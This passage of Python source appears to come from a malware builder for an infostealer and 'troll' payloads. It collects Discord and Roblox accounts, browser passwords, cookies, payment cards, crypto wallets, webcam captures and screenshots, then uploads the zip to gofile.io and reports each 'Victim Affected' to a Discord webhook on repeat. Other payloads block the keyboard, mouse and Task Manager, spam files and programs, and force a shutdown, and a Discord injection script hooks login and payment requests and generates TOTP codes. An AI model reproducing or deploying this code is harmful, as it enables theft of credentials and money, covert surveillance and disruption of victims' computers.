        v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
    except Exception as e:
        v4r_number_files = f"Error: {e}"

    if v4r_number_discord_injection != None:
        v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

    if v4r_status_camera_capture != None:
        v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

    if v4r_status_screenshot != None:
        v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

    if v4r_status_system_info != None:
        v4r_option.append(f"System Info       : {v4r_status_system_info}")

    if v4r_number_discord_account != None:
        v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

    if v4r_number_roblox_account != None:
        v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

    if v4r_number_passwords != None:
        v4r_option.append(f"Passwords         : {v4r_number_passwords}")

    if v4r_number_cookies != None:
        v4r_option.append(f"Cookies           : {v4r_number_cookies}")

    if v4r_number_cards != None:
        v4r_option.append(f"Cards             : {v4r_number_cards}")

    if v4r_number_history != None:
        v4r_option.append(f"Browsing History  : {v4r_number_history}")

    if v4r_number_downloads != None:
        v4r_option.append(f"Download History  : {v4r_number_downloads}")

    if v4r_number_extentions != None:
        v4r_option.append(f"Extentions        : {v4r_number_extentions}")

    if v4r_name_wallets != None:
        v4r_option.append(f"Wallets           : {v4r_name_wallets}")

    if v4r_name_game_launchers != None:
        v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
    
    if v4r_name_apps != None:
        v4r_option.append(f"Apps              : {v4r_name_apps}")
    
    if v4r_number_files != None:
        v4r_option.append(f"Interesting Files : {v4r_number_files}")

v4r_zip_buffer.seek(0)

v4r_download_link = "Upload failed (timeout)"
for v4r_gofile_attempt in range(3):
    try:
        try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer", timeout=15).read().decode('utf-8'))["data"]["server"]
        except: v4r_gofileserver = "store4"
        v4r_response = requests.post(
            f"https://{v4r_gofileserver}.gofile.io/uploadFile",
            files={"file": (f"BLX_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)},
            timeout=120
        )
        v4r_download_link = v4r_response.json()["data"]["downloadPage"]
        break
    except Exception:
        if v4r_gofile_attempt < 2:
            time.sleep(3)
        else:
            v4r_download_link = "Upload failed (timeout)"

embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}
Ip Public   : {v4r_ip_address_public}
Ip Local    : {v4r_ip_adress_local}
Country     : {v4r_country}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(v4r_option)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{v4r_download_link}"""
).set_footer(
    text=v4r_footer_text, 
    icon_url=v4r_avatar_embed
)

def D3f_S3ndW3bh00k(embed, max_retries=3):
    for attempt in range(max_retries):
        try:
            try:
                v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
                v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
                return True
            except Exception:
                v4r_embed_dict = {"embeds": [embed.to_dict()], "username": v4r_username_embed, "avatar_url": v4r_avatar_embed}
                requests.post(v4r_w3bh00k_ur1, json=v4r_embed_dict, headers={"Content-Type": "application/json"}, timeout=30)
                return True
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(2)
    return False

try: D3f_S3ndW3bh00k(embed)
except: pass


try: threading.Thread(target=D3f_B10ckK3y).start()
except: pass
try: threading.Thread(target=D3f_B10ckT45kM4n4g3r).start()
except: pass
try: threading.Thread(target=D3f_B10ckW3b5it3).start()
except: pass
try: threading.Thread(target=D3f_St4rtup).start()
except: pass
try: threading.Thread(target=D3f_Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=D3f_R3st4rt).start()
except: pass
try: threading.Thread(target=D3f_Shutd0wn).start()
except: pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4mOpti0ns = r'''
def D3f_Sp4mOpti0ns():
    import keyboard
    while True:
        try:
            D3f_B10ckM0u53()
            D3f_Sp4m0p3nPr0gr4m()
            D3f_Sp4mCr34tFil3()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass
''' 

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

R3st4rt = r'''
def D3f_R3st4rt():
    import time
    
    while True:
        time.sleep(300)

        v4r_option = []

        v4r_zip_buffer = io.BytesIO()
        with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

            try: 
                v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
            except Exception as e:
                v4r_number_discord_injection = f"Error: {e}"

            try: 
                v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
            except Exception as e:
                v4r_status_system_info = f"Error: {e}"

            try: 
                v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
            except Exception as e:
                v4r_number_discord_account = f"Error: {e}"

            try: 
                v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
            except Exception as e:
                v4r_number_extentions = f"Error: {e}"
                v4r_number_passwords = f"Error: {e}"
                v4r_number_cookies = f"Error: {e}"
                v4r_number_history = f"Error: {e}"
                v4r_number_downloads = f"Error: {e}"
                v4r_number_cards = f"Error: {e}"

            try: 
                v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
            except Exception as e:
                v4r_number_roblox_account = f"Error: {e}"

            try: 
                v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
            except Exception as e:
                v4r_status_camera_capture = f"Error: {e}"

            try: 
                v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
            except Exception as e:
                v4r_status_screenshot = f"Error: {e}"

            try: 
                v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
            except Exception as e:
                v4r_status_screenshot = f"Error: {e}"

            try: 
                v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
            except Exception as e:
                v4r_number_files = f"Error: {e}"

            if v4r_number_discord_injection != None:
                v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

            if v4r_status_camera_capture != None:
                v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

            if v4r_status_screenshot != None:
                v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

            if v4r_status_system_info != None:
                v4r_option.append(f"System Info       : {v4r_status_system_info}")

            if v4r_number_discord_account != None:
                v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

            if v4r_number_roblox_account != None:
                v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

            if v4r_number_passwords != None:
                v4r_option.append(f"Passwords         : {v4r_number_passwords}")

            if v4r_number_cookies != None:
                v4r_option.append(f"Cookies           : {v4r_number_cookies}")

            if v4r_number_cards != None:
                v4r_option.append(f"Cards             : {v4r_number_cards}")

            if v4r_number_history != None:
                v4r_option.append(f"Browsing History  : {v4r_number_history}")

            if v4r_number_downloads != None:
                v4r_option.append(f"Download History  : {v4r_number_downloads}")

            if v4r_number_extentions != None:
                v4r_option.append(f"Extentions        : {v4r_number_extentions}")

            if v4r_name_wallets != None:
                v4r_option.append(f"Wallets           : {v4r_name_wallets}")

            if v4r_name_game_launchers != None:
                v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
            
            if v4r_name_apps != None:
                v4r_option.append(f"Apps              : {v4r_name_apps}")
            
            if v4r_number_files != None:
                v4r_option.append(f"Interesting Files : {v4r_number_files}")

        v4r_zip_buffer.seek(0)

        v4r_download_link = "Upload failed (timeout)"
        for v4r_gofile_attempt in range(3):
            try:
                try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer", timeout=15).read().decode('utf-8'))["data"]["server"]
                except: v4r_gofileserver = "store4"
                v4r_response = requests.post(
                    f"https://{v4r_gofileserver}.gofile.io/uploadFile",
                    files={"file": (f"BLX_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)},
                    timeout=120
                )
                v4r_download_link = v4r_response.json()["data"]["downloadPage"]
                break
            except Exception:
                if v4r_gofile_attempt < 2:
                    time.sleep(3)
                else:
                    v4r_download_link = "Upload failed (timeout)"

        embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
        ).add_field(
            inline=False,
            name="Summary of Information", 
            value=f"""```
        Hostname    : {v4r_hostname_pc}
        Username    : {v4r_username_pc}
        DisplayName : {v4r_displayname_pc}
        Ip Public   : {v4r_ip_address_public}
        Ip Local    : {v4r_ip_adress_local}
        Country     : {v4r_country}```"""
        ).add_field(
            inline=False,
            name="Stolen Information", 
            value=f"""```swift
        {"\n".join(v4r_option)}```"""
        ).add_field(
            inline=False,
            name="Download Link", 
            value=f"""{v4r_download_link}"""
        ).set_footer(
            text=v4r_footer_text, 
            icon_url=v4r_avatar_embed
        )

        try: D3f_S3ndW3bh00k(embed)
        except: pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

def M3ss4g3P0pup(title, message, popup_type="error"):
    t = str(title).replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r")
    m = str(message).replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r")
    pt = str(popup_type).strip().lower()
    if pt == "info":
        mb_call = 'messagebox.showinfo("{t}", "{m}")'
    elif pt == "warning":
        mb_call = 'messagebox.showwarning("{t}", "{m}")'
    elif pt == "question":
        mb_call = 'messagebox.askokcancel("{t}", "{m}")'
    else:
        mb_call = 'messagebox.showerror("{t}", "{m}")'
    mb_call = mb_call.format(t=t, m=m)
    return f'''
def D3f_M3ss4g3P0pup():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    {mb_call}
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Shutd0wn = r'''
def D3f_Shutd0wn():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4m0p3nPr0gr4m = r'''
def D3f_Sp4m0p3nPr0gr4m():
    import subprocess
    import threading

    def D3f_Sp4m():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def D3f_Request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=D3f_Sp4m)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    D3f_Request()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckK3y = r'''
def D3f_B10ckK3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def D3f_Unb10ckK3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckT45kM4n4g3r = r'''
def D3f_B10ckT45kM4n4g3r():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

B10ckM0u53 = r'''
def D3f_B10ckM0u53():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Sp4mCr34tFil3 = r'''
def D3f_Sp4mCr34tFil3():
    import random
    import string
    import threading

    ext = [".exe", ".py", ".txt", ".png", ".ico", ".bat", 
           ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
           ".mov", ".jpg", ".pdf", ".troll", ".cooked",
           ".lol", ".funny", ".virus", ".malware"
           ".blx", ".blx", ".blx", ".blx"
    ]
    def D3f_Cr43t():
        file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)

        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(("".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(999999)))) * random.randint(9999999999999999999999999, 9999999999999999999999999999999999999999)

    def D3f_Request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=D3f_Cr43t)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    D3f_Request()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Di5c0rdIj3ct10n = r'''
v4r_inj3c710n_c0d3 = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

